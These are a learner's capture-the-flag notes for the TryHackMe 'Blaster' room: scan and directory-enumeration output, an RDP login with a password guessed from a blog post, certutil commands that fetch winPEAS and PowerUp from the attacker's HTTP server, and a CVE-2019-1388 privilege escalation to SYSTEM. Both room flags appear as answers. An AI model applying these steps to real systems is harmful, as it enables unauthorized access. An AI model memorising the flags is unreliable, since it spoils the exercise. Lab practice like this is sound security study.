```
Blaster-tryhackme-CVE-2019-1388
https://tryhackme.com/room/blaster
IP:10.10.6.106
lessons learned:
- #essentially what happened is when looking at the cert for HHUPD.exe it opens a website that runs as system and you navigate to the location of cmd.exe using the filename "C:\Windows\System32\*.*" to show the hidden files in the system32 folder and right click cmd.exe and click open, the reason you get system is becuase in order to open a cmd in system 32 you need system privileges.
- inspect web servers all the way.
```

```
1:58 PM 1/21/2023
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-21 18:57 EST
Nmap scan report for 10.10.6.106
Host is up (0.20s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-01-21T23:58:17+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2023-01-21T23:58:13+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2023-01-20T23:55:07
|_Not valid after:  2023-07-22T23:55:07
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2s, deviation: 0s, median: -2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.70 seconds
```

```
2:01 PM 1/21/2023																						# nothing found
dirsearch -u http://10.10.6.106:80 -x 400,401,403
```

```
2:06 PM 1/21/2023
──(root㉿kali)-[/home/kali/Documents/tryhackme/blaster]
└─# gobuster dir -u http://10.10.6.106:80 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64 
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.6.106:80
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/21 19:06:06 Starting gobuster in directory enumeration mode
===============================================================
/retro                (Status: 301) [Size: 151] [--> http://10.10.6.106:80/retro/]
Progress: 207643 / 207644 (100.00%)
===============================================================
2023/01/21 19:17:30 Finished
```

```
2:33 PM 1/21/2023
gobuster dir -u http://10.10.6.106:80/retro/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64 
2023/01/21 19:32:13 Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 162] [--> http://10.10.6.106:80/retro/wp-content/]
/wp-includes          (Status: 301) [Size: 163] [--> http://10.10.6.106:80/retro/wp-includes/]
/wp-admin             (Status: 301) [Size: 160] [--> http://10.10.6.106:80/retro/wp-admin/]


2:38 PM 1/21/2023
┌──(root㉿kali)-[/home/kali/Documents/tryhackme/blaster]
└─# gobuster dir -u http://10.10.6.106:80/retro/wp-admin/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.6.106:80/retro/wp-admin/		[+] Method:                  GET
																											[+] Threads:                 64
																											[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
																											[+] Negative Status codes:   404
																											[+] User Agent:              gobuster/3.4
																											[+] Timeout:                 10s
																											===============================================================
																											2023/01/21 19:37:22 Starting gobuster in directory enumeration mode
																											===============================================================
																											/images               (Status: 301) [Size: 167] [--> http://10.10.6.106:80/retro/wp-admin/images/]	#access denied
																											/user                 (Status: 301) [Size: 165] [--> http://10.10.6.106:80/retro/wp-admin/user/]	# http://10.10.6.106:80/retro/wp-admin/user/
																											/network              (Status: 301) [Size: 168] [--> http://10.10.6.106:80/retro/wp-admin/network/]	#same as above
																											/css                  (Status: 301) [Size: 164] [--> http://10.10.6.106:80/retro/wp-admin/css/]			# access denied
																											/includes             (Status: 301) [Size: 169] [--> http://10.10.6.106:80/retro/wp-admin/includes/]	#access denied
																											/js                   (Status: 301) [Size: 163] [--> http://10.10.6.106:80/retro/wp-admin/js/]
																											Progress: 13860 / 207644 (6.67%)^C
```

```
2:41 PM 1/21/2023
																											┌──(root㉿kali)-[/home/kali/Documents/tryhackme/blaster]
																											└─# gobuster dir -u http://10.10.6.106:80/retro/wp-content/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64
																											===============================================================
																											Gobuster v3.4
																											by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
																											===============================================================
																											[+] Url:                     http://10.10.6.106:80/retro/wp-content/
																											[+] Method:                  GET
																											[+] Threads:                 64
																											[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
																											[+] Negative Status codes:   404
																											[+] User Agent:              gobuster/3.4
																											[+] Timeout:                 10s
																											===============================================================
																											2023/01/21 19:40:50 Starting gobuster in directory enumeration mode
																											===============================================================
																											/themes               (Status: 301) [Size: 169] [--> http://10.10.6.106:80/retro/wp-content/themes/]	# blank page
																											/uploads              (Status: 301) [Size: 170] [--> http://10.10.6.106:80/retro/wp-content/uploads/]	# access denied
																											/plugins              (Status: 301) [Size: 170] [--> http://10.10.6.106:80/retro/wp-content/plugins/]	# blank page
																											/upgrade              (Status: 301) [Size: 170] [--> http://10.10.6.106:80/retro/wp-content/upgrade/]	# denied
																											Progress: 14494 / 207644 (6.98%)^C
																											[!] Keyboard interrupt detected, terminating.
```

```
2:43 PM 1/21/2023
																											┌──(root㉿kali)-[/home/kali/Documents/tryhackme/blaster]
																											└─# gobuster dir -u http://10.10.6.106:80/retro/wp-includes/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64
																											===============================================================
																											Gobuster v3.4
																											by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
																											===============================================================
																											[+] Url:                     http://10.10.6.106:80/retro/wp-includes/
																											[+] Method:                  GET
																											[+] Threads:                 64
																											[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
																											[+] Negative Status codes:   404
																											[+] User Agent:              gobuster/3.4
																											[+] Timeout:                 10s
																											===============================================================
																											2023/01/21 19:42:24 Starting gobuster in directory enumeration mode
																											===============================================================
																											/images               (Status: 301) [Size: 170] [--> http://10.10.6.106:80/retro/wp-includes/images/]
																											/text                 (Status: 301) [Size: 168] [--> http://10.10.6.106:80/retro/wp-includes/text/]
																											/css                  (Status: 301) [Size: 167] [--> http://10.10.6.106:80/retro/wp-includes/css/]
																											/js                   (Status: 301) [Size: 166] [--> http://10.10.6.106:80/retro/wp-includes/js/]
																											/blocks               (Status: 301) [Size: 170] [--> http://10.10.6.106:80/retro/wp-includes/blocks/]
																											/widgets              (Status: 301) [Size: 171] [--> http://10.10.6.106:80/retro/wp-includes/widgets/]
																											/fonts                (Status: 301) [Size: 169] [--> http://10.10.6.106:80/retro/wp-includes/fonts/]
																											/customize            (Status: 301) [Size: 173] [--> http://10.10.6.106:80/retro/wp-includes/customize/]	#denied
																											/certificates         (Status: 301) [Size: 176] [--> http://10.10.6.106:80/retro/wp-includes/certificates/]	#denied
																											/requests             (Status: 301) [Size: 172] [--> http://10.10.6.106:80/retro/wp-includes/requests/]		# denied
																											/id3                  (Status: 301) [Size: 167] [--> http://10.10.6.106:80/retro/wp-includes/id3/]	# denied
																											Progress: 25036 / 207644 (12.06%)^C
																											[!] Keyboard interrupt detected, terminating.
```

```
2:48 PM 1/21/2023
user named wade on /retro website
```

```
2:50 PM 1/21/2023
the ready player one post by wade has the potential password: parzival in it
```

```
2:52 PM 1/21/2023																								#user.txt THM{HACK_PLAYER_ONE}
rdesktop 10.10.6.106
wade:parzival
```

```
2:54 PM 1/21/2023
C:\Users\Wade>systeminfo

Host Name:                 RETROWEB
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00377-60000-00000-AA691
Original Install Date:     12/8/2019, 10:50:43 PM
System Boot Time:          1/21/2023, 3:54:18 PM
System Manufacturer:       Amazon EC2
System Model:              t3a.small
System Type:               x64-based PC																						#x64
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2200 Mhz
BIOS Version:              Amazon EC2 1.0, 10/16/2017
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,016 MB
Available Physical Memory: 950 MB
Virtual Memory: Max Size:  2,400 MB
Virtual Memory: Available: 1,260 MB
Virtual Memory: In Use:    1,140 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\RETROWEB
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: KB3192137
Network Card(s):           1 NIC(s) Installed.
                           [01]: Amazon Elastic Network Adapter
                                 Connection Name: Ethernet 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.6.106
                                 [02]: fe80::c4c1:c03c:10c0:88d9
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

```
2:56 PM 1/21/2023														
# hosting server to xfer winpeas
└─# python3 -m http.server               
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
2:56 PM 1/21/2023
certutil -urlcache -f http://10.13.13.125:8000/winPEASx64.exe			
#windows defender killed winPEASx64
```

```
3:00 PM 1/21/2023
certutil -urlcache -f http://10.13.13.125:8000/PowerUp.ps1				
#windows defender issue
```

```
3:07 PM 1/21/2023
HHUPD.exe is on desktop lookup CVE to exploit this service		# CVE-2019-1388
https://www.youtube.com/watch?v=3BQKpPNlTSo												
# awesome ZDI CVE walkthrough, going to follow through.
```

```
3:20 PM 1/21/2023																		
# on as system after following video
C:\Windows\System32>whoami
nt authority\system

C:\Windows\System32>



#essentially what happened is when looking at the cert for HHUPD.exe it opens a website that runs as system and you navigate to the location of cmd.exe using the filename "C:\Windows\System32\*.*" to show the hidden files in the system32 folder and right click cmd.exe and click open, the reason you get system is becuase in order to open a cmd in system 32 you need system privileges.


C:\Users\Administrator\Desktop>type root.txt
THM{COIN_OPERATED_EXPLOITATION}